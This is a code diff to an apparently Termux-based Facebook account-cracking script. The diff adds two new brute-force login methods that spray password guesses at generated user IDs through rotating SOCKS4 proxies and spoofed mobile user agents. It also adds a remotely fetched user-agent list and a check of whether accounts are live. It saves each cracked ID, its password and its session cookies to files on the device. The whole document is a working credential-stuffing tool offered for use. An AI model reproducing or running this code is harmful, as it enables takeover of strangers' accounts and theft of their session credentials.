@@ -63,11 +63,40 @@ except Exception as e:
 	print('Allow Termux Permissions ! And Run Again ')
 	exit()
 try:
- prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ prox= requests.get('https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=socks4&country=all&anonymity=all&timeout=20000&proxy_format=ipport&format=text').text
  open('.prox.txt','w').write(prox)
 except Exception as e:
  print('')
 prox=open('.prox.txt','r').read().splitlines()
+
+
+#-----------------------ua---------------------------------
+try:
+ prd= requests.get('https://raw.githubusercontent.com/mdtasin123/SERVER/main/allmoder.txt').text
+ open('.prd.txt','w').write(prd)
+except Exception as e:
+ print('')
+prd=open('.prd.txt','r').read().splitlines()
+
+#-----userid-separate----#
+def user_id(coki):
+    c_user_index = coki.find('c_user=')
+    if c_user_index != -1:
+        user_id = coki[c_user_index + len('c_user='):]
+        user_id = user_id.split(';')[0]  # Extract the user ID
+    else:
+        user_id = ""
+    return user_id
+ #-------checker------#
+def lock_check(uid):
+    sessionx=requests.Session()
+    urlx=f'https://www.facebook.com/p/{uid}'
+    req=BeautifulSoup(sessionx.get(urlx).content,'html.parser')
+    tx=req.find('title').text
+    if tx =='Facebook':
+        return('LOCK')
+    else:
+        return('LIVE')
 apiua=[]
 uapi=[]
 for xd in range(10000):
@@ -242,6 +271,18 @@ for xd in range(1000):
     g=random.randrange(10,200)
     h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/392.2.0.33.108;]'
     uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
+    ugen.append(uaku2)
+for xd in range(1000):
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
+    realme6= random.choice(['RMX3890','RMX3762','RMX3687','RMX3840','RMX3834','RMX3371','RMX3370','RMX3506','RMX3372','RMX3501','RMX3388','RMX3472','RMX3235','RMX2040','RMX1921','RMX1801','RMX3381','RMX3115','RMX3085'])
+    c=' Build/RKQ1.211019.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    d=random.randrange(10,200)
+    e='0'
+    f=random.randrange(1000,8000)
+    g=random.randrange(10,200)
+    h='Mobile Safari/537.36'
+    uaku2=(f'{a} {b}; {realme6}{c}{d}.{e}.{f}.{g} {h}')
     ugen.append(uaku2)
 for ua in range(10000):
     a='Mozilla/5.0 (Symbian/55; Series60/'
@@ -513,6 +554,8 @@ def fuck():
 	lin()
 	print(f'   {B}|{G}01{B}|{W} Method {B}|{G} M1 {B}|{W}')
 	print(f'   {B}|{G}02{B}|{W} Method {B}|{G} M2 {B}|{W}')
+	print(f'   {B}|{G}02{B}|{W} Method {B}|{G} M3 {B}|{W}')
+	print(f'   {B}|{G}02{B}|{W} Method {B}|{G} M4 {B}|{W}')
 	lin()
 	mthod = input(f'   {B}|{G}★{B}|{W} Choice {R}:{G} ')
 	clr()
@@ -525,7 +568,7 @@ def fuck():
 	for nmbr in range(99999):
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		user.append(nmp)
-	with ThreadPool(max_workers=50) as yaari:
+	with ThreadPool(max_workers=30) as yaari:
 		clr()
 		tl = '99999'
 		lin()
@@ -543,6 +586,10 @@ def fuck():
 				yaari.submit(rcrack1,uid,pwx,tl)
 			if mthod in ['2','02']:
 				yaari.submit(rcrack2,uid,pwx,tl)
+			if mthod in ['3','03']:
+				yaari.submit(rcrack3,uid,pwx,tl)
+			if mthod in ['4','04']:
+				yaari.submit(rcrack4,uid,pwx,tl)
 			else:
 				yaari.submit(rcrack1,uid,pwx,tl)
 def bd():
@@ -556,6 +603,8 @@ def bd():
 	lin()
 	print(f'   {B}|{G}01{B}|{W} Method {B}|{G} M1 {B}|{W}')
 	print(f'   {B}|{G}02{B}|{W} Method {B}|{G} M2 {B}|{W}')
+	print(f'   {B}|{G}02{B}|{W} Method {B}|{G} M3 {B}|{W}')
+	print(f'   {B}|{G}02{B}|{W} Method {B}|{G} M4 {B}|{W}')
 	lin()
 	mthod = input(f'   {B}|{G}★{B}|{W} Choice {R}:{G} ')
 	clr()
@@ -587,6 +636,10 @@ def bd():
 				yaari.submit(rcrack1,uid,pwx,tl)
 			if mthod in ['2','02']:
 				yaari.submit(rcrack2,uid,pwx,tl)
+			if mthod in ['3','03']:
+				yaari.submit(rcrack3,uid,pwx,tl)
+			if mthod in ['4','04']:
+				yaari.submit(rcrack4,uid,pwx,tl)
 			else:
 				yaari.submit(rcrack1,uid,pwx,tl)
 def rcrack1(uid,pwx,tl):
@@ -639,12 +692,13 @@ def rcrack1(uid,pwx,tl):
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki.split('c_user=')[1].split(';')[0]
-                if uid in oks:
-                    pass
-                else:
+                cid = user_id(coki)
+                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
+                res = requests.get(ckk).text
+                if 'Photoshop' in res:
                     print(f"\r{G}   [SRX-OK] {W}{cid}|{ps}")
                     print(f"\r{G}   [SRX-COOKIE] {W}{coki}")
+                    open('/sdcard/SRX-UA.txt','a').write(pro+'\n')
                     open('/sdcard/SRX-OK.txt', 'a').write( cid+'|'+ps+'|'+coki+'\n')
                     oks.append(uid)
                     break
@@ -667,8 +721,8 @@ def rcrack2(uid,pwx,tl):
     global proxy
     try:
         for ps in pwx:
-            #pro = random.choice(ugen)
-            pro = "[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 3;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+            pro = random.choice(prd)
+            #pro = "[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 3;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
             session = requests.Session()
             sys.stdout.write(f'\r   {B}|{G}M2{B}|{W}[{G}SRX-PRO{H}] [{G}%s{H}|{G}%s{H}] [{G}%s{H}] '%(loop,tl,len(oks))),
             sys.stdout.flush()
@@ -686,33 +740,34 @@ def rcrack2(uid,pwx,tl):
             header_freefb = {"authority": 'free.facebook.com',
             "method": 'GET',
             "scheme": 'https',
-            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
-            "accept-encoding": 'gzip, deflate, br',
-            "accept-language": 'en-US,en;q=1',
-            'cache-control': 'no-cache, no-store, must-revalidate',
-            "referer": 'https://t.facebook.com/',
-            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
-            "sec-ch-ua-mobile": '?1',
-            "sec-ch-ua-platform": "Windows",
-            "sec-fetch-dest": 'document',
-            "sec-fetch-mode": 'navigate',
-            "sec-fetch-site": 'same-origin',
-            "sec-fetch-user": '?0',
-            "pragma": 'no-cache',
-            "priority": 'u=0',
-            'cross-origin-resource-policy': 'cross-origin',
-            "upgrade-insecure-requests": '1',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-PK,en-GB,en-US;q=0.9,en;q=0.8,en;q=0.7', 
+            'dnt':'1', 
+            'x-requested-with':'mark.via.gp', 
+            'sec-fetch-site': 'none',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-user': '?1',
+            'sec-fetch-dest': 'document',
+            'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '" Not A;Brand";v="106", "Chromium";v="30", "Google Chrome";v="45"',
+            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Windows"',
+            "sec-ch-prefers-color-scheme": "light",
             "user-agent": pro}
             lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki.split('c_user=')[1].split(';')[0]
-                print(f"\r{G}   [SRX-OK] {W}{cid}|{ps}")
-                print(f"\r{G}   [SRX-COOKIE] {W}{coki}")
-                open('/sdcard/SRX-OK.txt', 'a').write( cid+'|'+ps+'|'+coki+'\n')
-                oks.append(uid)
-                break
+                cid = user_id(coki)
+                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
+                res = requests.get(ckk).text
+                if 'Photoshop' in res:
+                    print(f"\r{G}   [SRX-OK] {W}{cid}|{ps}")
+                    print(f"\r{G}   [SRX-COOKIE] {W}{coki}")
+                    open('/sdcard/SRX-UA.txt','a').write(pro+'\n')
+                    open('/sdcard/SRX-OK.txt', 'a').write( cid+'|'+ps+'|'+coki+'\n')
+                    oks.append(uid)
+                    break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:156]
@@ -725,6 +780,158 @@ def rcrack2(uid,pwx,tl):
         loop+=1
     except:
         rcrack2(uid,pwx,tl)
+def rcrack3(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global prox
+    try:
+        for ps in pwx:
+            pro = random.choice(prd)
+            nip=random.choice(prox)
+            proxs= {'http': 'socks4://'+nip}
+            #pro = "[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 3;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+            session = requests.Session()
+            sys.stdout.write(f'\r   {B}|{G}M3{B}|{W}[{G}SRX-PRO{H}] [{G}%s{H}|{G}%s{H}] [{G}%s{H}] '%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            free_fb = session.get('https://p.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'Host': 'p.facebook.com',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-mobile': '?1',
+            'viewport-width': '2499',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+            'sec-ch-ua-model': '"moto z4"',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua-platform': '"Android"',
+            'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'no-cors',
+            'sec-fetch-dest': 'image',
+            'referer': 'https://p.facebook.com/',
+            'accept-encoding': 'gzip, deflate, br',
+            'accept-language': 'en-US,en;q=0.9',
+            "user-agent": pro}
+            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb, proxy=proxs).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = user_id(coki)
+                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
+                res = requests.get(ckk).text
+                if 'Photoshop' in res:
+                    print(f"\r{G}   [SRX-OK] {W}{cid}|{ps}")
+                    print(f"\r{G}   [SRX-COOKIE] {W}{coki}")
+                    open('/sdcard/SRX-UA.txt','a').write(pro+'\n')
+                    open('/sdcard/SRX-OK.txt', 'a').write( cid+'|'+ps+'|'+coki+'\n')
+                    oks.append(uid)
+                    break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[141:156]
+                #print(f"\r{R}   [SRX-CP] {cid}|{ps}")
+                open('/sdcard/SRX-CP.txt', 'a').write( cid+'|'+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        rcrack3(uid,pwx,tl)
+
+def rcrack4(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(prd)
+            #pro = "[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 3;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+            session = requests.Session()
+            sys.stdout.write(f'\r   {B}|{G}M4{B}|{W}[{G}SRX-PRO{H}] [{G}%s{H}|{G}%s{H}] [{G}%s{H}] '%(loop,tl,len(oks))),
+            sys.stdout.flush()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {"authority": 'mbasic.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            'authority': 'developer.facebook.com',
+            'x-fb-rlafr': '0',
+            'access-control-allow-origin': '*',
+            'facebook-api-version': 'v17.0',
+            'strict-transport-security': 'max-age=15552000',
+            'pragma': 'no-cache',
+            'cache-control': 'private, no-cache, no-store, must-revalidate',
+            'x-fb-request-id': 'A5ZKh_85GaagpB8XJbwc9jD',
+            'x-fb-trace-id': 'DKv719n6x5A',
+            'x-fb-rev': '1007660106',
+            'x-fb-debug': '0Wgri/aCTmjxPumj0+CG/zZiMXJ7STJoeBV090VKxpelr/8ZFdv2Yhf8eVXye88jFgf4VfRJ/fAhAmK5VclVPQ==',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'origin': 'https://mbasic.facebook.com',
+            'referer': 'https://mbasic.facebook.com/',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"13.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            "user-agent": pro}
+            #print(log_data)
+            #print(header_freefb)
+            #print(ps)
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = user_id(coki)
+                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
+                res = requests.get(ckk).text
+                if 'Photoshop' in res:
+                    print(f"\r{G}   [SRX-OK] {W}{cid}|{ps}")
+                    print(f"\r{G}   [SRX-COOKIE] {W}{coki}")
+                    open('/sdcard/SRX-UA.txt','a').write(pro+'\n')
+                    open('/sdcard/SRX-OK.txt', 'a').write( cid+'|'+ps+'|'+coki+'\n')
+                    oks.append(uid)
+                    break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = uid
+                #print(f"\r{R}   [SRX-CP] {cid}|{ps}")
+                open('/sdcard/SRX-CP.txt', 'a').write( cid+'|'+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        rcrack4(uid,pwx,tl)
 def ffb(ids,names,passlist):
         global loop,oks,cps
         sys.stdout.write(f'\r\r\033[1;37m   [SRX-PRO] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
@@ -748,10 +955,13 @@ def ffb(ids,names,passlist):
                         if "c_user" in Shahin:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m   [SRX-OK] %s | %s'%(ids,pas))
-                                print(f"\r{G}   [SRX-COOKIE] {W}{kuki}")
-                                open('/sdcard/SRX-FILE-OK.txt', 'a').write( ids+'|'+ps+'|'+coki+'\n')
-                                #cek_apk(session,coki)
+                                ckk = f'https://graph.facebook.com/{ids}/picture?type=normal'
+                                res = requests.get(ckk).text
+                                if 'Photoshop' in res:
+                                    print(f'\r\r\033[1;32m   [SRX-OK] %s | %s'%(ids,pas))
+                                    print(f"\r{G}   [SRX-COOKIE] {W}{kuki}")
+                                    open('/sdcard/SRX-FILE-OK.txt', 'a').write( ids+'|'+pas+'|'+kuki+'\n')
+                                    #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Shahin:
